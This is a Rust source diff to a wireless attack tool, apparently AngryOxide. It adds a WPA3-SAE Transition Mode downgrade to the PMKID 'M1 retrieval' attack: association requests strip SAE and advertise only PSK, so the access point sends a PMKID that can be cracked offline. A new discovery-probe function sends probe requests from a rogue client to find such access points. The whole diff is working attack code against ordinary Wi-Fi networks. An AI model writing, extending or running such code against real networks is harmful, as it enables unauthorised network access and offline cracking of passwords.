@@ -20,8 +20,8 @@ use crate::{
         build_association_request_rg, build_authentication_frame_noack,
         build_authentication_frame_with_params, build_csa_action, build_csa_beacon,
         build_deauthentication_fm_ap, build_deauthentication_fm_client,
-        build_disassocation_from_ap, build_disassocation_from_client, build_probe_response,
-        build_reassociation_request,
+        build_disassocation_from_ap, build_disassocation_from_client, build_probe_request_ap_ssid,
+        build_probe_response, build_reassociation_request,
     },
     write_packet, OxideRuntime,
 };
@@ -256,7 +256,12 @@ pub fn m1_retrieval_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Res
         return Ok(());
     }
 
-    // Ensure the AP uses PSK (from the robust security ie)
+    // Determine whether this is a WPA3-SAE Transition Mode AP (SAE + PSK both present).
+    // Transition mode APs accept PSK-only association requests (WPA2 path), so we can
+    // elicit an M1 with PMKID by advertising only PSK in our association request.
+    let is_transition = ap_data.information.is_sae_transition_mode();
+
+    // Require PSK support (explicit WPA2 or WPA3-SAE Transition Mode).
     if !ap_data.information.rsn_akm_psk.is_some_and(|psk| psk) {
         return Ok(());
     }
@@ -286,7 +291,11 @@ pub fn m1_retrieval_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Res
     ap_data.interactions += 1;
     oxide.status_log.add_message(StatusMessage::new(
         MessageType::Info,
-        format!("M1 Retrieval - Sent Authentication Req [{}]", ap_mac),
+        format!(
+            "M1 Retrieval{} - Sent Authentication Req [{}]",
+            if is_transition { " (SAE Transition)" } else { "" },
+            ap_mac
+        ),
     ));
 
     Ok(())
@@ -332,6 +341,11 @@ pub fn m1_retrieval_attack_phase_2(
         return Ok(());
     }
 
+    // For WPA3-SAE Transition Mode APs, the association request advertises only the PSK
+    // AKM (SAE is deliberately stripped), forcing the AP onto its WPA2 code path.  The
+    // AP then sends an M1 EAPOL that may contain a PSK-derived PMKID crackable offline.
+    let is_transition = ap_data.information.is_sae_transition_mode();
+
     let cs = if ap_data.information.cs_tkip.is_some_and(|f| f) {
         RsnCipherSuite::TKIP
     } else {
@@ -358,7 +372,11 @@ pub fn m1_retrieval_attack_phase_2(
     ap_data.interactions += 1;
     oxide.status_log.add_message(StatusMessage::new(
         MessageType::Info,
-        format!("M1 Retrieval - Sent Association Req [{}]", ap_mac),
+        format!(
+            "M1 Retrieval{} - Sent Association Req [{}]",
+            if is_transition { " (SAE Transition PSK Downgrade)" } else { "" },
+            ap_mac
+        ),
     ));
 
     Ok(())
@@ -759,6 +777,99 @@ pub fn rogue_m2_attack_undirected(
             ));
         }
     }
+
+    Ok(())
+}
+
+//////////////////////////////////////////////////////////////
+//                                                          //
+//         WPA3-SAE Transition Mode Discovery Probe         //
+//  When an AP is seen advertising SAE but PSK support has  //
+//  not yet been confirmed, we send a unicast probe request  //
+//  carrying the AP's SSID.  The AP's probe response        //
+//  contains its full RSN IE; if that IE includes PSK the   //
+//  AP is in WPA3-SAE Transition Mode.  The probe response  //
+//  handler in main.rs updates the AP's RSN flags and       //
+//  immediately fires m1_retrieval_attack, collapsing the   //
+//  discovery and PMKID collection into one event cycle.    //
+//                                                          //
+//////////////////////////////////////////////////////////////
+
+pub fn transition_probe_attack(oxide: &mut OxideRuntime, ap_mac: &MacAddress) -> Result<(), String> {
+    if oxide.config.disable_pmkid {
+        return Ok(());
+    }
+
+    if oxide.config.notx {
+        return Ok(());
+    }
+
+    let ap_data = if let Some(ap) = oxide.access_points.get_device(ap_mac) {
+        ap
+    } else {
+        return Ok(());
+    };
+
+    if !oxide.target_data.targets.is_target(ap_data) {
+        return Ok(());
+    }
+
+    if oxide.target_data.whitelist.is_whitelisted(ap_data) {
+        return Ok(());
+    }
+
+    if oxide
+        .handshake_storage
+        .has_complete_handshake_for_ap(ap_mac)
+    {
+        return Ok(());
+    }
+
+    // Only relevant when SAE is advertised
+    if !ap_data.information.rsn_akm_sae.is_some_and(|sae| sae) {
+        return Ok(());
+    }
+
+    // PSK already confirmed — m1_retrieval_attack handles it from here
+    if ap_data.information.rsn_akm_psk.is_some_and(|psk| psk) {
+        return Ok(());
+    }
+
+    // We already received a probe response from this AP; if PSK still isn't
+    // in it there is nothing more to learn by probing again
+    if ap_data.pr_station.is_some() {
+        return Ok(());
+    }
+
+    // Need an SSID to address the probe request
+    let ssid = if let Some(ssid) = ap_data.ssid.clone() {
+        ssid
+    } else {
+        return Ok(());
+    };
+
+    // Rate-limit to one probe per 32 beacons so we don't hammer the AP
+    // before its response arrives (~3 s at a typical 10 beacon/s rate)
+    if ap_data.beacon_count % 32 != 0 {
+        return Ok(());
+    }
+
+    let frx = build_probe_request_ap_ssid(
+        ap_mac,
+        &oxide.target_data.rogue_client,
+        &ssid,
+        oxide.counters.sequence2(),
+    );
+
+    let _ = write_packet(oxide.raw_sockets.tx_socket.as_raw_fd(), &frx);
+    ap_data.interactions += 1;
+    oxide.status_log.add_message(StatusMessage::new(
+        MessageType::Info,
+        format!(
+            "SAE Transition Discovery Probe: {} ({})",
+            ap_mac, ssid
+        ),
+    ));
 
     Ok(())
 }
